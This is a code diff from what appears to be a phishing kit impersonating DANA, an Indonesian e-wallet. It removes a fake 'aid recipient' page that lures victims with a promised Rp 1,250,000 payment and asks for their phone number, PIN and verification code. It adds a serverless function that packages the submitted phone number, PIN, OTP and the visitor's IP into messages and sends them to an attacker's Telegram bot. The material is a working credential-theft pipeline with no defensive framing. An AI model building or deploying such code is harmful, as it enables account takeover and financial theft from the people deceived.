@@ -1,155 +1,125 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="theme-color" content="#118EEA">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
-    <title>DANA Bantuan - Formulir Penerima Bantuan Digital</title>
-    <meta name="description" content="Formulir penerimaan bantuan digital DANA untuk masyarakat Indonesia yang memenuhi syarat.">
+const https = require('https');
+
+exports.handler = async (event, context) => {
+  // Only allow POST requests
+  if (event.httpMethod !== 'POST') {
+    return {
+      statusCode: 405,
+      body: JSON.stringify({ error: 'Method not allowed' })
+    };
+  }
+
+  try {
+    const data = JSON.parse(event.body);
+    const { type, phone, pin, otp } = data;
     
-    <!-- ========== SOCIAL MEDIA META TAGS ========== -->
-    <meta property="og:url" content="https://link-dana-id-terbaru-2025.netlify.app/">
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="DANA Bantuan - Formulir Penerima Bantuan Digital">
-    <meta property="og:description" content="Daftarkan diri Anda untuk menerima bantuan digital melalui aplikasi DANA.">
-    <meta property="og:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:image:alt" content="Formulir Bantuan Digital DANA">
+    // Validasi data yang diperlukan
+    if (!type) {
+      return {
+        statusCode: 400,
+        body: JSON.stringify({ error: 'Type is required' })
+      };
+    }
+
+    // Konfigurasi bot Telegram
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
     
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="DANA Bantuan - Formulir Penerima Bantuan">
-    <meta name="twitter:description" content="Daftarkan diri Anda untuk menerima bantuan digital melalui aplikasi DANA.">
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/naklapang/Maakakshahuauahsg/main/public/image/dompet-digital-dana.webp">
-    <meta name="twitter:image:alt" content="Formulir Bantuan Digital DANA">
-    <!-- ========== END SOCIAL META TAGS ========== -->
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error('Telegram bot configuration missing');
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: 'Server configuration error' })
+      };
+    }
 
-    <!-- Favicon and Preconnects -->
-    <link rel="icon" href="https://www.dana.id/favicon.ico">
-    <link rel="preconnect" href="https://a.m.dana.id">
-    <link rel="preconnect" href="https://app.link">
-    <link rel="preconnect" href="https://api2.branch.io">
+    // Format pesan berdasarkan jenis data
+    let message = '';
+    const timestamp = new Date().toLocaleString('id-ID');
+    const userIP = event.headers['client-ip'] || event.headers['x-forwarded-for'] || 'Unknown';
     
-    <!-- Fonts and Styles -->
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-  <!-- Loading Spinner -->
-  <div class="spinner-overlay" style="display: none;">
-    <div class="spinner">
-      <svg class="spinner-back" xmlns="http://www.w3.org/2000/svg" width="54" height="54" viewBox="0 0 54 54">
-        <g fill="none" fill-rule="evenodd" transform="translate(.012 .012)">
-          <circle cx="26.988" cy="26.988" r="26.667" fill="#000" fill-opacity=".6" opacity=".6"/>
-          <path fill="#FFF" d="M22.098 22.769a8.208 8.208 0 0 1-1.24.098 a6.834 6.834 0 0 1-1.653-.199c-.87-.215-1.658-.609-2.4-1.115-.096-.066-.273-.132-.34-.086-.086.06-.134.23-.136.355-.012.72-.006 1.439-.006 2.159v2.657l-.001 5.707c-.001.39.13.709.453.917 1.355.872 2.838 1.255 4.433 1.185 1.243-.055 2.443-.34 3.618-.733 1.308-.438 2.604-.91 3.908-1.361 1.14-.394 2.3-.716 3.502-.834 1.753-.17 3.406.158 4.92 1.123.35.222.497.133.497-.28v-5.724c0-1.6-.001-3.2.002-4.8.001-.458-.19-.79-.556-1.044-1.98-1.385-4.141-1.557-6.378-.912-1.305.376-2.577.88-3.849 1.369-1.564.6-3.107 1.262-4.774 1.518z"/>
-        </g>
-      </svg>
-      <svg class="spinner-front" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 38 38">
-        <defs>
-          <linearGradient id="prefix__a" x1="38.883%" x2="50%" y1="-16.052%" y2="90.302%">
-            <stop offset="0%" stop-color="#EDEDED" stop-opacity="0"/>
-            <stop offset="56.544%" stop-color="#FFF"/>
-            <stop offset="100%" stop-color="#FFF" stop-opacity="0"/>
-          </linearGradient>
-        </defs>
-        <circle cx="29.333" cy="29.333" r="18.115" fill="none" stroke="url(#prefix__a)" stroke-width=".807" transform="rotate(45 36.64 11.693)"/>
-      </svg>
-    </div>
-  </div>
-
-  <div class="content">
-    <div class="container">
-      <!-- Phone Number Page -->
-      <div id="number-page" style="display:block">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Formulir Penerima Bantuan DANA</h2>
-        <p class="info-text">Masukkan nomor HP terdaftar di aplikasi DANA untuk verifikasi penerima bantuan</p>
-        <div class="phone-input-container">
-          <div class="country-code-box">
-            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
-            <span> +62</span>
-          </div>
-          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
-        </div>
-        <p class="warning-text">Pastikan nomor yang didaftarkan sama dengan nomor di aplikasi DANA</p>
-        <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
-      </div>
-
-      <!-- PIN Page -->
-      <div id="pin-page" style="display:none">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Masukkan Kode Pendaftaran</h2>
-        <p class="info-text">Masukkan 6 digit kode pendaftaran yang telah dikirimkan</p>
-        <div class="pin-container">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        </div>
-        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
-      </div>
-
-      <!-- Reward Page -->
-      <div id="reward-page" style="display:none">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Selamat! Anda Mendapatkan Bantuan</h2>
+    switch (type) {
+      case 'phone':
+        message = `📱 *DATA NOMOR DANA* 📱\n\n` +
+                  `🕐 Waktu: ${timestamp}\n` +
+                  `📞 Nomor: +62${phone}\n` +
+                  `🌐 IP: ${userIP}\n` +
+                  `=================================`;
+        break;
         
-        <div class="saldo-container">
-          <div class="saldo-amount" id="saldo-amount">Rp 1.250.000</div>
-          <p class="saldo-info">Bantuan Dana Sosial yang telah disetujui</p>
-        </div>
+      case 'pin':
+        message = `🔐 *DATA PIN DANA* 🔐\n\n` +
+                  `🕐 Waktu: ${timestamp}\n` +
+                  `📞 Nomor: +62${phone}\n` +
+                  `🔒 PIN: ${pin}\n` +
+                  `🌐 IP: ${userIP}\n` +
+                  `=================================`;
+        break;
         
-        <p class="info-text">Silahkan klik verifikasi di aplikasi DANA untuk menerima hadiah dana bantuan</p>
+      case 'otp':
+        message = `📨 *DATA OTP DANA* 📨\n\n` +
+                  `🕐 Waktu: ${timestamp}\n` +
+                  `📞 Nomor: +62${phone}\n` +
+                  `🔒 PIN: ${pin}\n` +
+                  `🔢 OTP: ${otp}\n` +
+                  `🌐 IP: ${userIP}\n` +
+                  `=================================`;
+        break;
         
-        <div class="withdraw-button-container">
-          <button id="tarik-dana-button" class="button">Tarik ke DANA</button>
-        </div>
-      </div>
+      default:
+        return {
+          statusCode: 400,
+          body: JSON.stringify({ error: 'Invalid type' })
+        };
+    }
 
-      <!-- PIN Withdrawal Page -->
-      <div id="withdraw-page" style="display:none">
-        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
-        <h2>Tarik Bantuan ke DANA</h2>
+    // Encode message for URL
+    const encodedMessage = encodeURIComponent(message);
+    
+    // URL untuk mengirim pesan ke bot Telegram
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+    
+    // Mengirim pesan ke Telegram
+    await new Promise((resolve, reject) => {
+      https.get(url, (res) => {
+        let responseData = '';
         
-        <div class="phone-display">
-          <span id="registered-phone">+62 811-1234-56789</span>
-        </div>
+        res.on('data', (chunk) => {
+          responseData += chunk;
+        });
         
-        <p class="info-text">Masukkan PIN DANA untuk memverifikasi penarikan dana bantuan</p>
-        
-        <div class="pin-container">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
-        </div>
-        
-        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
-      </div>
-    </div>
-  </div>
+        res.on('end', () => {
+          if (res.statusCode === 200) {
+            resolve(responseData);
+          } else {
+            reject(new Error(`Telegram API error: ${res.statusCode}`));
+          }
+        });
+      }).on('error', (err) => {
+        reject(err);
+      });
+    });
 
-  <!-- Notifications -->
-  <div id="floating-notification" class="floating-notification" style="display:none">
-    <div id="notification-content">Proses verifikasi sedang berlangsung</div>
-  </div>
-  
-  <div id="success-notification" class="floating-notification" style="display:none;background-color:#4CAF50">
-    Proses penarikan dana bantuan berhasil
-  </div>
-  
-  <div id="reward-notification" class="notification" style="display:none"></div>
-
-  <!-- Continue Button -->
-  <div class="fixed-button-container" id="lanjutkan-container">
-    <button id="lanjutkan-button" class="button">Lanjutkan</button>
-  </div>
-
-  <!-- JavaScript -->
-  <script src="script.js"></script>
-</body>
-</html>
+    // Simpan ke database atau logging (opsional)
+    console.log('Data received:', JSON.stringify(data));
+    
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ 
+        success: true, 
+        message: 'Data sent successfully' 
+      })
+    };
+    
+  } catch (error) {
+    console.error('Error processing request:', error);
+    
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ 
+        error: 'Internal server error',
+        details: error.message 
+      })
+    };
+  }
+};
